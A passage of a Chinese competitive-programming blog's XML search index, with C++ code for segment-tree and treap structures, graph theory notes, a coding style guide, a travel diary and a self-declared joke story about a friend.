*root, int key) &#123; if (root-&gt;key == key) &#123; if (root-&gt;cnt &gt; 1) &#123; root-&gt;cnt--; root-&gt;size--; return; &#125; if (root-&gt;left == NULL) root = root-&gt;right; if (root-&gt;right == NULL) root = root-&gt;left; if (root-&gt;left-&gt;priority &lt; root-&gt;right-&gt;priority) &#123; Right_rotate (root); Delete (root, key); &#125; else &#123; Left_rotate (root); Delete (root, key); &#125; &#125; else if (key &lt; root-&gt;key) &#123; Delete (root-&gt;left, key); root-&gt;size--; &#125; else &#123; Delete (root-&gt;right, key); root-&gt;size--; &#125;&#125;/*------SegmentTree Start------*/void Change (Node *root, int left, int right, int x, int key, int y) &#123; Delete (root, y); Insert (root, key); if (left == right) return; int mid = (left + right) &gt;&gt; 1; if(x &lt;= mid) Change(root-&gt;left, left, mid, x, key, y); else Change(root-&gt;right, mid + 1, right, x, key, y);&#125;void build (Node *root, int left, int right, int x, int num) &#123; Insert(root, num); if(left == right) return; int mid = (left + right) &gt;&gt; 1; if(x &lt;= mid) build(root-&gt;left, left, mid, x, num); else build(root-&gt;right, mid + 1, right, x, num);&#125;void find (Node *root, int key) &#123; if(root == NULL) return; if(root-&gt;key &lt;= key) &#123; tmp += root-&gt;left-&gt;size + root-&gt;cnt; find(root-&gt;right, key); &#125; else find(root-&gt;left, key);&#125;void query(Node *root, int left, int right, int x, int y, int num) &#123; if(left == x &amp;&amp; right == y) &#123; find(root, num); return; &#125; int mid = (left + right) &gt;&gt; 1; if(mid &gt;= y) query(root-&gt;left, left, mid, x, y, num); else if(mid &lt; x) query(root-&gt;right, mid + 1, right, x, y, num); else &#123; query(root-&gt;left, left, mid, x, mid, num); query(root-&gt;right, mid + 1, right, mid + 1, y, num); &#125;&#125;/************End**********/int SlowRead()&#123; int data = 0, w = 1; char ch = 0; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int opt, n, m;int Data[MAXN];int main(int argc, char const *argv[]) &#123;#ifndef FILE_LOCK freopen ("test.in", "r", stdin ); freopen ("ans.ans", "w", stdout);#endif srand(SRAND_TIME); scanf("%d", &amp;opt); while(opt--) &#123; n = SlowRead(); m = SlowRead(); for (int i = 1; i &lt;= n; i++) Data[i] = SlowRead(); for (int i = 1; i &lt;= n; i++) build(root, 1, n, i, Data[i]); for (int i = 1; i &lt;= m; i++) &#123; char opts[3]; int x, y, z; scanf("%s", opts); if(opts[0] == 'C') &#123; scanf("%d%d", &amp;x, &amp;y); Change(root, 1, n, x, y, Data[x]); Data[x] = y; &#125; else &#123; scanf("%d%d%d", &amp;x, &amp;y, &amp;z); int l = 0, r = 1000000000; while(l &lt;= r) &#123; int mid = (l + r) &gt;&gt; 1; tmp = 0; query(root, 1, n, x, y, mid); if(tmp &gt;= z) r = mid - 1; else l = mid + 1; &#125; printf("%d\n", l); &#125; &#125; &#125; return 0;&#125;// 完美结束]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>模版</tag>
        <tag>树套树</tag>
        <tag>线段树</tag>
        <tag>Treap</tag>
        <tag>数堆</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zkw线段树]]></title>
    <url>%2Farticles%2Fzkw-tree-algorithm%2F</url>
    <content type="text"><![CDATA[zkwzkwzkw线段树是一种十分好用的线段树特点： 非递归，效率高，代码短预备知识一个节点的父节点是这个数左移111，这个位运算就是低位舍弃，所有数字左移一位一个节点的子节点是这个数右移111，是左节点，右移111, +1+1+1是右节点同一层的节点是依次递增的，第nnn层有2n−12^{n-1}2​n−1​​个节点最后一层有多少节点，值域就是多少(这个很重要)有了这些知识就可以开始着手建树了建树查询区间[1,n]\left[1,n\right][1,n]BuildBuildBuild函数就这么出来了！找到不小于nnn的222的次幂 直接输入叶节点的信息123456int n, M, q;int d[N &lt;&lt; 1]; inline void Build (int n) &#123; for(M = 1; M &lt; n; M &lt;&lt;= 1); for(int i = M + 1; i &lt;= M + n; i++) d[i] = in(); &#125;维护父节点信息倒续访问，每个节点访问的时候它的子节点已经处理过辣！维护区间和1for(int i = M - 1; i; i--) d[i] = d[i &lt;&lt; 1] + d[i &lt;&lt; 1 | 1];维护最大值1for(int i = M - 1; i; i--) d[i] = max(d[i &lt;&lt; 1], d[i &lt;&lt; 1 | 1]);维护最小值1for(int i = M - 1; i; i--) d[i] = min(d[i &lt;&lt; 1], d[i &lt;&lt; 1 | 1]);这样就构造出了一颗二叉树，也就是zkw线段树了！操作/optoptopt单点修改w1234void Change (int x, int v) &#123; d[x = M + x] += v; while (x) d[x &gt;&gt;= 1] = d[x &lt;&lt; 1] + d[x &lt;&lt; 1 | 1]; &#125;单点查询(差分思想，后面会用到)把d维护的值修改一下，变成维护它与父节点的差值(为后面的RMQ问题做准备) 建树的过程就要修改一下咯！12345void Build (int n) &#123; for(M = 1; M &lt;= n + 1; M &lt;&lt;= 1) ; for(int i = M + 1; i &lt;= M + n; i++) d[i] = in(); for(int i = M - 1; i; i--) d[i] = min(d[i &lt;&lt; 1], d[i &lt;&lt; 1 | 1]), d[i &lt;&lt; 1] - = d[i], d[ i&lt;&lt; 1 | 1] -= d[i]; &#125;在当前情况下的查询1234void Sum (int x, int res = 0) &#123; while (x) res += d[x], x &gt;&gt;= 1; return res; &#125;区间操作询问区间和，把[s,t]\left[s,t\right][s,t]闭区间换成(s,t)\left(s,t\right)(s,t)开区间来计算1234567int Sum (int s, int t, int Ans = 0)&#123; for (s = s + M - 1, t = t + M + 1; s ^ t ^ 1; s &gt;&gt;= 1, t &gt;&gt;= 1) &#123; if(~s &amp; 1) Ans += d[s ^ 1]; if( t &amp; 1) Ans += d[t ^ 1]; &#125; return Ans; &#125;为什么 s&amp;1~s\&amp;1 s&amp;1?为什么 t&amp;1t\&amp;1t&amp;1? 变成开区间了以后，如果sss是左儿子，那么它的兄弟节点一定在区间内，同理，如果ttt是右儿子，那么它的兄弟节点也一定在区间内！这样计算不会重复吗？答案是会的！所以注意迭代的出口s^t^1 如果s,ts,ts,t就是兄弟节点，那么也就迭代完成了。区间最小值123456789void Sum (int s, int t, int L = 0, int R = 0) &#123; for(s = s + M - 1, t = t + M + 1; s ^ t ^ 1; s &gt;&gt;= 1, t &gt;&gt;= 1) &#123; L += d[s], R += d[t]; if(~s &amp; 1) L = min(L, d[s ^ 1]); if( t &amp; 1) R = min(R, d[t ^ 1]); &#125; int res = min(L, R); while (s) res += d[s &gt;&gt;= 1]; &#125;区间最大值123456789void Sum (int s, int t, int L = 0, int R = 0)&#123; for(s = s + M - 1, t = t + M + 1; s ^ t ^ 1; s &gt;&gt;= 1, t &gt;&gt;= 1) &#123; L += d[s], R += d[t]; if(~s &amp; 1) L = max(L, d[s ^ 1]); if( t &amp; 1) R = max(R, d[t ^ 1]); &#125; int res = max(L, R); while (s) res += d[s &gt;&gt;= 1]; &#125;区间加法123456789void Add (int s, int t, int v, int A = 0) &#123; for(s = s + M - 1, t = t + M + 1; s ^ t ^ 1; s &gt;&gt;= 1, t &gt;&gt;= 1) &#123; if(~s &amp; 1) d[s ^ 1] += v; if( t &amp; 1) d[t ^ 1] += v; A = min(d[s], d[s ^ 1]); d[s] -= A, d[s ^ 1] -=A, d[s &gt;&gt; 1] += A; A = min(d[t], d[t ^ 1]); d[t] -= A, d[t ^ 1] -=A, d[t &gt;&gt; 1] += A; &#125; while (s) A = min (d[s], d[s ^ 1]), d[s] -= A, d[s ^ 1] -= A, d[s &gt;&gt;= 1] += A; &#125;zkw线段树小试牛刀123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt; #include &lt;cstdio&gt; const int MAXN = 261244; const int MAXM = 524289;int n, m, f, x, y; int tr[MAXM];void query (int s, int t) &#123; int ans = 0; for (s = s + M - 1, t = t + M + 1; s ^ t ^ 1; s &gt;&gt;= 1, t &gt;&gt;= 1) &#123; if (~s &amp; 1) ans += tr[s ^ 1]; if ( t &amp; 1) ans += tr[t ^ 1]; &#125; printf ("%d\n", ans); &#125; void change (int x, int y) &#123; for (tr[x += M] += y, x &gt;&gt;= 1; x; x &gt;&gt;= 1) tr[x] = tr[x &lt;&lt; 1] + tr[x &lt;&lt; 1 | 1]; &#125; int main (int argc, char *const argv[]) &#123; scanf ("%d", &amp;n); for (int i = 1; i &lt;= n; i++) &#123; scanf ("%d", &amp;x); change(i, x); &#125; scanf ("%d", &amp;m); for (int i = 1; i &lt;= m; i++) &#123; scanf ("%d%d%d", &amp;f, &amp;x, &amp;y); if(f == 1) change (x, y); else query (x, y); &#125; return 0; &#125;可持久化线段树版本？！（来自http://blog.csdn.net/forget311300/article/details/44306265）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt; #include &lt;cstdio&gt; #include &lt;cstring&gt; #include &lt;cmath&gt; #include &lt;algorithm&gt; #include &lt;vector&gt; #define mp(x,y) make_pair(x,y) using namespace std; const int N = 100000; const int inf = 0x3f3f3f3f; int a[N + 10]; int b[N + 10]; int M; int lq, rq; vector&lt;pair&lt;int, int&gt; &gt; s[N * 22]; void add(int id, int cur) &#123; cur += M; int lat = 0; if (s[cur].size()) lat = s[cur][s[cur].size() - 1].second; s[cur].push_back(mp(id, ++lat)); for (cur &gt;&gt;= 1; cur; cur &gt;&gt;= 1) &#123; int l = 0; if (s[cur &lt;&lt; 1].size()) l = s[cur &lt;&lt; 1][s[cur &lt;&lt; 1].size() - 1].second; int r = 0; if (s[cur &lt;&lt; 1 | 1].size()) r = s[cur &lt;&lt; 1 | 1][s[cur &lt;&lt; 1 | 1].size() - 1].second; s[cur].push_back(mp(id, l + r)); &#125; &#125; int Q(int id, int k) &#123; if (id &gt;= M) return id - M; int l = id &lt;&lt; 1, r = l ^ 1; int ll = lower_bound(s[l].begin(), s[l].end(), mp(lq, inf)) - s[l].begin() - 1; int rr = lower_bound(s[l].begin(), s[l].end(), mp(rq, inf)) - s[l].begin() - 1; int kk = 0; if (rr &gt;= 0)kk = s[l][rr].second; if (ll &gt;= 0)kk = s[l][rr].second - s[l][ll].second; if (kk &lt; k)return Q(r, k - kk); return Q(l, k); &#125; int main() &#123; int n, m; while (~scanf("%d%d", &amp;n, &amp;m)) &#123; for (int i = 0; i &lt; n; i++) &#123; scanf("%d", a + i); b[i] = a[i]; &#125; sort(b, b + n); int nn = unique(b, b + n) - b; for (M = 1; M &lt; nn; M &lt;&lt;= 1); for (int i = 1; i &lt; M + M; i++) &#123; s[i].clear(); //s[i].push_back(mp(0, 0)); &#125; for (int i = 0; i &lt; n; i++) &#123; int id = lower_bound(b, b + nn, a[i]) - b; add(i + 1, id); &#125; while (m--) &#123; int k; scanf("%d %d %d", &amp;lq, &amp;rq, &amp;k); lq--; int x = Q(1, k); printf("%d\n", b[x]); &#125; &#125; return 0; &#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>算法</tag>
        <tag>线段树</tag>
        <tag>zkw线段树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「图论」二分图]]></title>
    <url>%2Farticles%2Fer-fen-tu%2F</url>
    <content type="text"><![CDATA[在火车上先水一发二分图最大匹配吧二分图，是图论中一种十分常用的模型G=(V,E)G=\left(V, E\right)G=(V,E)是一个无向图如果GGG的顶点集VVV可分割为两个互不相交的子集XXX和YYY，并且EEE中每条边连接的两个顶点一个在XXX中，另一个在YYY中，则称图GGG为二分图，记为G=(X,Y,E)G=\left( X , Y , E \right )G=(X,Y,E)那么，问题来了：给定一个无向联通图，如何判定该图是否为一个二分图？匹配给定一个二分图G=(X,Y,E)G=(X,Y,E)G=(X,Y,E)若存在EEE的一个子集MMM，满足MMM中的任意两条边都没有公共顶点，则MMM称为一个GGG的匹配一些概念：匹配边：在匹配中的边未匹配边：不在匹配中的边未匹配点：对于一个匹配，不与任何匹配边邻接的点匹配点：刚好相反极大匹配：无法再加边的匹配最大匹配：在所有极大匹配中，边数∣M∣|M|∣M∣最大的匹配完全匹配：如果一个匹配中，图中每个顶点都与一条边相关联，则称此匹配为完全匹配]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>二分图</tag>
        <tag>图论</tag>
        <tag>二分图匹配</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[济南7日游Day - $-1$]]></title>
    <url>%2Farticles%2F18-4-27-things%2F</url>
    <content type="text"><![CDATA[梦回济南回首过往，我已经发表了50+50 +50+篇文章了，看来离6月份前100+100+100+篇还是一个很遥远的目标在去济南前先水一发随笔吧，也就当是个目标了4月28 ，济南我没学习的算法还有不少。打算在济南好好学习图论，毕竟图论我还是落下了不少然而并没有什么时间去颓废了qwq，时间也不多了。想想去年济南，真是浪费了太多时间，又有多少时间可以浪费呢先列个计划吧，已掌握的就当做复习了 最短路 最小生成树 二分图 Tarjian 网络流以上只是大体，我也没具体列举到细节，也待日后补充吧。在济南的这几天也尽量多发几篇题解笔记，刷题好，刷好题，好刷题。最近换了Deepin，Hexo , Git , npm 都重新装了一遍（装炸了好几次，最后一看都是权限的问题，哭晕在厕所.jpgDeepin美化还是十分好的了，我就不用在自己重新美化了qwq]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>济南</tag>
        <tag>集训</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shq's code style]]></title>
    <url>%2Farticles%2FCode-Style-for-OI%2F</url>
    <content type="text"><![CDATA[本文是介绍Shq大蒟蒻的代码规范example:12345while (x == y) &#123; something(); somethingelse();&#125;finalthing();123456789101112if (data != NULL &amp;&amp; res &gt; 0) &#123; if (JS_DefineProperty(cx, o, "data", STRING_TO_JSVAL(JS_NewStringCopyN(cx, data, res)), NULL, NULL, JSPROP_ENUMERATE) != 0) &#123; QUEUE_EXCEPTION("Internal error!"); goto err; &#125; PQfreemem(data);&#125; else &#123; if (JS_DefineProperty(cx, o, "data", OBJECT_TO_JSVAL(NULL), NULL, NULL, JSPROP_ENUMERATE) != 0) &#123; QUEUE_EXCEPTION("Internal error!"); goto err; &#125;&#125;头文件#include 中，C 标准库头文件必须使用 c 前缀，而不是 .h 后缀。所有的 #include &lt;...&gt; 指令必须放置于整个程序开头所有头文件应该由长度排序不同功能的头文件应该分开example:12345678#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;stack&gt;#include &lt;set&gt;缩进对于每个代码块，使用 4 空格或等长的 Tab严格缩进1astyle参数: --indent=spaces=4大括号大括号不换行！大括号不换行！大括号不换行！左括号的左边必须有且仅有一个空格example:123inline void spaw (int &amp;a, int &amp;b) &#123; a ^= b ^= a ^= b;&#125;空格逗号 , 与 for 中的分号 ; 后面必须有一个空格，前面不能有空格。1for (int i = 1; i &lt;= n; i++)左圆（方）括号后、右圆（方）括号前，在书写长表达式时，为了便于阅读，可以加一个空格，如1f[i][j] = f[ f[i][j - 1] ][j - 1]双目运算符、三目运算符的两侧必须有一个空格。1return a &gt; b ? a : b;单目运算符的两侧不能有空格。1tot++;冒号的两侧必须有一个空格。1234struct Edge &#123; int x; Edge() : x(0) &#123;&#125;&#125;流程控制关键字之后，左圆括号前必须有一个空格，函数名之后，左圆括号前可以有空格。对于「花括号不换行」，do-while 结构的 do 之后，左花括号前必须有一个空格，while 前必须有一个空格。123do &#123; c++;&#125; while (c &gt; 100);模板参数表中，如果右方括号前不得不加一个空格，则可以在对应的左方括号后加一个空格，为了对称。.、-&gt;、:: 的两边不能有空格。12345678910111213struct Node &#123; int key, priority; Node *left, *right;&#125;;Node *root;void Left_rotate(Node* root)&#123; Node* temp = root-&gt;right; root-&gt;right = temp-&gt;left; temp-&gt;left = root; root = temp;&#125;空行多个意义独立的代码块之间应该用空行隔开右花括号前不应该有多余的空行不应该有两个连续的空行非空行尾不应该有多余的空格所有的 #include 指令之后必须有一个空行函数、成员函数、结构体、全局变量块之间必须用空行隔开12345678910111213141516171819#include &lt;cstdio&gt;#include &lt;algorithm&gt;const int MAXN = 100;const int MAXM = 200;int n, m, a[MAXN + 1];double p, q, x, y;struct Node &#123; Node *left, *right; int key; bool Flag;&#125;;int main(int argc, const char argv[]) &#123; p = 1, q = 2; return 0;&#125;函数main 函数的返回值类型必须是 int，不可以省略 return 0;变量应该尽量少使用全局变量局部变量必须在用时定义，变量名不应该与上一个块中的变量重名，可以与全局变量重名指针与引用在描述类型名时，指针符号 * 和引用符号 &amp; 与左侧的类型名之间必须有一个空格，与右侧的其它关键字之间不能有空格，如 char *const 或 int *&amp;在定义变量、函数返回值、参数时，指针符号 * 和引用符号 &amp; 与左侧的类型名之间必须有一个空格，与右侧的变量、函数、参数名之间不能有空格命名所有结构体、函数、变量、参数名必须使用驼峰命名法，其中结构体名首字母必须大写，其它首字母必须小写为方便，命名中的单词可以使用缩写，函数、变量、参数名可以用一个小写字母代替。全局数组可以命名为一个大写字母1234567891011121314const int MAXN = 100010;int F[MAXN];int cnt, tot;struct Node &#123; int key, priority; Node *left, *right;&#125;;int f (int i) &#123; if (i == 1) return 1; return i * f(i - 1);&#125;到这里就是Shq毒瘤的代码习惯了]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>代码规范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lgy起源]]></title>
    <url>%2Farticles%2Flgy-from%2F</url>
    <content type="text"><![CDATA[很久很久以前，我们的宇宙比现在小得多，而且很热，恒星还没有出现。但已有物质从能量中沉淀出来，形成弥漫在发着红光的太空中的星云这时Lgy已经出现了，那是一种力场与稀薄的物质共同构成的生物，其个体看上去很像太空中的龙卷风。这种星云生物的进化速度快得像闪电，很快产生了遍布全宇宙的高度文明。当星云文明对宇宙终极真理的渴望达到顶峰时，全宇宙的所有世界一致同意，冒着真空衰变的危险进行创世能级的试验，以探索宇宙的大统一模型Lgy操纵物质世界的方式与现今宇宙中的生命完全不同，由于没有足够多的物质可供使用，他们的个体自己进化为自己想要的东西在最后的决定做出后，某些世界中的一些个体飞快地进化，把自己进化为加速器的一分部. 最后，上百万个这样的星云生物排列起来，组成了一台能把粒子加速到创世能级的高能加速器。加速器启动后，暗红色的星云中出现了一个发出耀眼蓝光的灿烂光环他们深知这个试验的危险，在试验进行的同时把得到的结果用引力波发射出去，引力波是惟一能在真空衰变后存留下来的信息载体加速器运行了一段时间后，真空衰变发生了，低能级的真空球从原子大小以光速膨胀，转眼间扩大到天文尺度，内部的一切蒸发殆尽。真空球的膨胀速度大于宇宙的膨胀速度，虽然经过了浸长的时间，最后还是毁灭了整个宇宙漫长的岁月过去了，在空无一物的宇宙中，被蒸发的物质缓慢地重新沉淀凝结，星云又出现了，但宇宙一片死寂，直到恒星和行星出现，生命才在宇宙中重新萌发。而这时，早已毁灭的星云文明发出的引力波还在宇宙中回荡，实体物质的重新出现使它迅速衰减，但就在它完全消失以前，被新宇宙中最早出现的文明接收到，它所带的信息被破译，从这远古的试验数据中，新文明得到了大统一模型他们发现，对建立模型最关键的数据，是在真空衰变前万分之一秒左右产生的让我们的思绪再回到那个毁灭中的星云宇宙，由于真空球以光速膨胀，球体之外的所有文明世界都处于光锥视界之外，不可能预知灾难的到来。在真空球到达之前，这些世界一定在专心地接收着回速器产生的数据。在他们收到足够建立大统一模型的数据后的万分之秒，真空坏毁灭了一切。但请注意一点：星云生物的思维频率极高，万分之一秒对他们来说是一段相当长的时间，所以他们有可能在生命的最后时刻推导出了大统一模型当然，这也可能只是我们的一种自我安慰，更有可能的是他们最后什么也没推导出来。星云文明掀开了宇宙的面纱，但他们自己没来得及向宇宙那终极的美瞥一眼就毁灭了。更为可敬的是，开始试验前他们可能已经想到了这种可能，牺牲自己，把那些包含着宇宙终极秘密的数据传给遥远未来的文明这时候，Lgy又诞生了，带着前世的记忆(好像从哪里见过)， 诞生在这个宇宙。经过了数以百计的时光，他们又达到这个宇宙的顶峰，他们早已知道了宇宙的真相和宇宙的目的，于是他们就失去了对这个宇宙的兴趣，开始了长达数个时间颗粒的沉睡.直到。。。直到人类的诞生。Lgy唤醒了前世的记忆，却，意外的遭到了前世记忆的侵蚀(喵？)，Lgy意外地发现，这种生物的感情十分丰富，多愁善感。其实Lgy在其他生物的诞生时也曾醒过来，但是毫无意义地发现这些生物的思维都十分单一，没有什么值得观察的。于是，Lgy饶有兴趣地观察了这个人类世界公元前594年 雅典的梭伦改革， Lgy看到了改革的过程。十四世纪，Lgy在意大利将自己的一些感悟，意大利出现资本主义萌芽。十五世纪晚期 英法中央集权国家形成，圈地运动开始。14-15世纪 欧洲出现资本主义萌芽。1840年前后，Lgy将自己的前世的记忆全部回忆了起来，在不违反知识传输通道的情况下，将自己文明前1e-10时间颗粒，（也就是1地球年年）的科技教给了一些西方国家，于是英国率先完成工业革命。18世纪60年代到19世纪中后期 英国在Lgy的赞助下进入自由资本主义阶段 ，Lgy又无聊江一些先进的知识（Lgy认为先进）教给了一些西方国家，并开始挑拨他们的关系。Lgy又开始无聊了，毕竟这就像一个没有未来的养成游戏一样，只有战争才是最美的，最美的艺术是战争，就有了第一次和第二次世界大战. 于是1914－1918年，由于德国和英国关系不合，开始了第一次世界大战。1931年 9．18日本帝国主义侵华的九一八事变 1939—1945年 第二次世界大战。1939年 9 月，第二次世界大战全面爆发 1937年 7月7日，中国全面抗日战争的开始 1945年 5月8日，德国签订无条件投降书。在战争期间，Lgy感觉误导文明并不好玩，就教了当时还是弱小的共产党一些理论知识，并化名马克思发表了一些自己没事无聊的想法Lgy发现这个世界又开始步入原来的正轨，踏上了共产主义现代化社会的道路，开始逐渐发展科技。于是，自己也注重起来科技。他江自己变成了概率电子云，覆盖着所有的平行宇宙，他也进入了十一个维度，有时也以三维投影出现在这个三维宇宙中，他发现，这个宇宙的光速如此地慢。记得前世，光可是能在一普郎克时间内从宇宙的一端，到另一端的！于是，Lgy踏上了科技发展的道路，几乎不再回头直到。直到。直到三维的人间中出现了OI这个东西。具体Lgy在OI中有什么成就也记不清了，那是我还是3,4岁，Lgy已经是那时代人的神话了吧。我查编了所有在图书馆的书籍，只在一个书角泛黄的书中找到了一些资料观自在高源，行深般若波罗蜜多时，照见01皆空，度一切OIer。 图灵机，P不异NP，NP不异P，P即是NP，NP即是P，受想行识亦复如是。 李高源，是诸码空相，不生不灭，不垢不净，不增不减。是故P中无NP，无图论DP，无莫比乌斯意，无狄利克雷法，无搜索乃至分治界，无二分亦无二分尽，乃至无代码，亦无代码尽，无一切算法，无数据结构。 以无代码故，菩提萨埵。依冯诺依曼故，心无代码；无代码故，无有算法，远离数据结构，究竟AK。 三世诸OIer，依李高源故，得阿耨多罗三藐三菩提。 故知李高源之名，是大神咒，是大明咒，是无上咒，是无等等咒，能A一切题，真实不虚。 故说李高源咒，即说咒曰： 高源高源 来%高源 快来%高源 他是最强的。- - - -Shq′sBlog\mathfrak {Shq&#x27;s \; Blog}Shq​′​​sBlog除了刚开始是引用大刘的一些话，后来全是自己胡乱写的qwq这是一个大坑，回来再填吧qwq]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>乱搞</tag>
        <tag>Lgy</tag>
        <tag>文学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「题解」P1001 a + b problem]]></title>
    <url>%2Farticles%2Fa-bproblem%2F</url>
    <content type="text"><![CDATA[洛谷P1001是道树链剖分的模板题明显，这题是道好用的模板题，大家可以做一下Code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;const int MAXN = 100000 + 10;inline void swap(int &amp;a, int &amp;b) &#123; a ^= b ^= a ^= b;&#125;inline int SlowRead () &#123; int data = 0, w = 1; char ch = getchar(); while (ch != '-' &amp;&amp; (ch &lt;'0' || ch &gt; '9')) ch = getchar(); if (ch == '-') ch = getchar(), w = -1; while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') &#123; data = (data &lt;&lt; 3) + (data &lt;&lt; 1) + ch - '0'; ch = getchar(); &#125; return data * w;&#125;struct Edge &#123; int to, dist, next;&#125;;struct Tree &#123; int key, add;&#125;;Edge edges[MAXN &lt;&lt; 1];Tree trees[MAXN &lt;&lt; 4];int head[MAXN];int son[MAXN],fa[MAXN],siz[MAXN],dep[MAXN],top[MAXN],id[MAXN],d[MAXN&lt;&lt;1][3];int tot = 0, cnt = 0;int a, b;void Add(int from, int to, int dist) &#123; edges[++tot].to = to; edges[tot].dist = dist; edges[tot].next = head[from]; head[from]=tot; edges[++tot].to = to; edges[tot].dist = dist; edges[tot].next = head[to]; head[to]=tot;&#125;void DFS1(int u, int f, int d)&#123; son[u]=0; fa[u] = f; siz[u] = 1; dep[u] = d; for(int i = head[u]; i; i = edges[i].next)&#123; int v = edges[i].to; if(v == f) continue; DFS1(v, u, d + 1); siz[u] += siz[v]; if(siz[son[u]] &lt; siz[v]) son[u] = v; &#125;&#125;void DFS2(int u, int tp) &#123; top[u] = tp;id[u] = ++cnt; if(son[u]) DFS2(son[u], tp); for(int i = head[u]; i; i = edges[i].next)&#123; int v = edges[i].to; if(v == fa[u] || v == son[u]) continue; DFS2(v,v); &#125;&#125;void pushdown(int rt, int l, int r) &#123; int mid=(l + r) &gt;&gt; 1; trees[rt &lt;&lt; 1].add += trees[rt].add; trees[rt &lt;&lt; 1 | 1].add += trees[rt].add; trees[rt &lt;&lt; 1].key += (mid - l + 1) * trees[rt].add; trees[rt &lt;&lt; 1 | 1].key += (r - mid) * trees[rt].add; trees[rt].add = 0;&#125;void update(int rt, int l, int r, int ul, int ur, int add) &#123; if(ul &gt; r || ur &lt; l)return; if(ul &lt;= l &amp;&amp; ur &gt;= r)&#123; trees[rt].add += add; trees[rt].key += (r - l + 1) * add; return; &#125; if(trees[rt].add) pushdown(rt, l, r); int mid = (l + r) &gt;&gt; 1; update(rt &lt;&lt; 1, l, mid, ul, ur, add); update(rt &lt;&lt; 1|1, mid + 1, r, ul, ur, add); trees[rt].key = trees[rt &lt;&lt; 1].key + trees[rt &lt;&lt; 1|1].key;&#125;int query(int rt, int l, int r, int ql, int qr) &#123; if(ql &gt; r || qr &lt; l) return 0; if(ql &lt;= l &amp;&amp; qr &gt;= r)return trees[rt].key; if(trees[rt].add)pushdown(rt, l, r); int mid = (l + r) &gt;&gt; 1; return query(rt &lt;&lt; 1, l, mid, ql, qr) + query(rt &lt;&lt; 1 | 1, mid + 1, r, ql, qr);&#125;int ask(int x, int y) &#123; int ans = 0; while(top[x] != top[y])&#123; if(dep[top[x]] &lt; dep[top[y]]) swap(x,y); ans += query(1, 1, cnt, id[top[x]] , id[x]); x = fa[top[x]]; &#125; if(x == y) return ans; if(dep[x] &gt; dep[y]) swap(x,y); ans += query(1, 1, cnt, id[son[x]], id[y]); return ans;&#125;void add_path(int x, int y, int k) &#123; while(top[x] != top[y])&#123; if(dep[top[x]] &lt; dep[top[y]]) swap(x, y); update(1, 1, cnt, id[top[x]], id[x], k); x = fa[top[x]]; &#125; if(x == y)return; if(dep[x] &gt; dep[y]) swap(x, y); update(1, 1, cnt, id[son[x]], id[y], k); return;&#125;int main(int argc, char *argv[]) &#123; a=SlowRead(); b=SlowRead(); Add(1, 2, a); Add(1, 3, b); d[1][0]=1; d[1][1]=2; d[1][2]=a; d[2][0]=1; d[2][1]=3; d[2][2]=b; DFS1(1, 0, 1); DFS2(1, 1); for(int i = 1; i &lt; 3; i++)&#123; if(dep[d[i][0]] &gt; dep[d[i][1]]) swap(d[i][0], d[i][1]); update(1, 1, cnt, id[d[i][1]], id[d[i][1]], d[i][2]); &#125; for(int i = 1; i &lt;= 1000000; i++)&#123; int k = rand() % 2666; add_path(1, 2, k); add_path(1, 3, k); add_path(2, 3, -k); &#125; std::cout &lt;&lt; ask(2, 3); return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>图论</tag>
        <tag>并查集</tag>
        <tag>树剖</tag>
        <tag>树链剖分</tag>
        <tag>邻接表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「图论」并查集]]></title>
    <url>%2Farticles%2FUnion-find-sets%2F</url>
